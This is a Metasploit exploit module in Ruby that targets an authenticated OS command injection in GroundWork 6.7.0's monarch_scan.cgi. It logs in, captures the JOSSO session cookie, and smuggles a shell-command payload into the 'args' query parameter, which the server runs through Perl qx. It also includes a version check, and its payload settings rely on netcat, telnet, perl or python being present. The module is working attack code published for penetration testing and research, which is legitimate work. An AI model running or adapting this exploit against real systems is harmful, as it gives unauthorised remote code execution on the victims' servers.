# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  HttpFingerprint = { :pattern => [ /Apache-Coyote\/1\.1/ ] }

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "GroundWork monarch_scan.cgi OS Command Injection",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in GroundWork 6.7.0. This software
        is used for network, application and cloud monitoring. The vulnerability exists in
        the monarch_scan.cgi, where user controlled input is used in the perl qx function,
        which allows any remote authenticated attacker, whatever his privileges are, to
        inject system commands and gain arbitrary code execution. The module has been tested
        successfully on GroundWork 6.7.0-br287-gw1571 as distributed within the Ubuntu 10.04
        based VM appliance.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Johannes Greil&#039;, # Vulnerability Discovery, PoC
          &#039;juan vazquez&#039;  # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;91051&#039; ],
          [ &#039;US-CERT-VU&#039;, &#039;345260&#039; ],
          [ &#039;URL&#039;, &#039;https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130308-0_GroundWork_Monitoring_Multiple_critical_vulnerabilities_wo_poc_v10.txt&#039; ]
        ],
      &#039;Arch&#039;            => ARCH_CMD,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 8190,
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;          =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;
            },
          # Based on the default Ubuntu 10.04 VM appliance
          &#039;RequiredCmd&#039; => &#039;generic telnet netcat perl python&#039;
        },
      &#039;Platform&#039;       => [&#039;unix&#039;, &#039;linux&#039;],
      &#039;Targets&#039;        =>
        [
          [&#039;GroundWork 6.7.0&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Mar 8 2013",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;USERNAME&#039;,  [true, &#039;GroundWork Username&#039;, &#039;user&#039;]),
          OptString.new(&#039;PASSWORD&#039;,  [true, &#039;GroundWork Password&#039;, &#039;user&#039;])
        ], self.class)
  end

  def check
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri("josso", "signon", "login.do")
    })

    if res and res.body =~ /GroundWork.*6\.7\.0/
      return Exploit::CheckCode::Appears
    elsif res and res.body =~ /GroundWork/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  end

  def get_josso_token
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri("josso", "signon", "usernamePasswordLogin.do"),
      &#039;vars_post&#039; => {
        &#039;josso_cmd&#039;      => &#039;login&#039;,
        &#039;josso_username&#039; => datastore[&#039;USERNAME&#039;],
        &#039;josso_password&#039; => datastore[&#039;PASSWORD&#039;]
      }
    })
    if res and res.headers[&#039;Set-Cookie&#039;] =~ /JOSSO_SESSIONID_josso=([A-F0-9]+)/
      return $1
    else
      return nil
    end
  end

  def execute_command(command)
    http_handler = ((datastore[&#039;SSL&#039;]) ? "https" : "http")
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri("monarch", "monarch_scan.cgi"),
      &#039;headers&#039;   =>
        {
          &#039;Referer&#039; => "#{http_handler}://#{rhost}/portal/auth/portal/groundwork-monitor/auto-disc"
        },
      &#039;cookie&#039;    => "JOSSO_SESSIONID=#{@josso_id}",
      &#039;query&#039;     => "args=#{rand_text_alpha(3)}&args=#{rand_text_alpha(3)}&args=#{Rex::Text.uri_encode(command + ";")}"
    })
    return res
  end

  def exploit
    peer = "#{rhost}:#{rport}"

    print_status("#{peer} - Attempting to login...")
    @josso_id = get_josso_token
    if @josso_id.nil?
      fail_with(Exploit::Failure::NoAccess, "#{peer} - Unable to retrieve a JOSSO session ID")
    end
    print_good("#{peer} - Authentication successful")

    print_status("#{peer} - Sending malicious request...")
    execute_command(payload.encoded)
  end
end

